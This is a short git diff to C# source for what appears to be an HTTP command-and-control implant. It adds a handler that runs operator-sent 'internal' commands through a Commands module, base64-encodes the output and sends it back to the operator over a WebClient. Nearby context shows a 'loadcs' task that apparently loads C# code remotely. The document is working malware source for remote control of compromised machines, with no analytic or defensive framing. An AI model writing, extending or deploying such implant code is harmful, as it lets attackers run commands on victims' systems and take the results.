@@ -7,7 +7,6 @@ using System.Timers;
 using HTTPImplant.Modules;
 using System.Runtime.InteropServices;
 using System.Threading.Tasks;
-using NewImplant.Modules;
 
 namespace HTTPImplant
 {
@@ -83,6 +82,15 @@ namespace HTTPImplant
                             string outputBase64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(output));
                             await SendResult(webClient, implantId, command.Operator, outputBase64);
                         }
+                        else if (command.Input.Trim().Equals("internal", StringComparison.OrdinalIgnoreCase))
+                        {
+                            string[] result = command.command.Split(new string[] { "#" }, StringSplitOptions.None);
+                            string opCommand = result[0];
+                            string args = result[1];
+                            string output = Commands.command(opCommand, args);
+                            string outputBase64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(output));
+                            await SendResult(webClient, implantId, command.Operator, outputBase64);
+                        }
                         else if (command.Input.Trim().ToLower().Equals("loadcs"))
                         {
                             try
@@ -110,6 +118,7 @@ namespace HTTPImplant
                     }
                     catch (Exception e)
                     {
+                        Console.WriteLine(e.Message);
                     }
                 }
             }
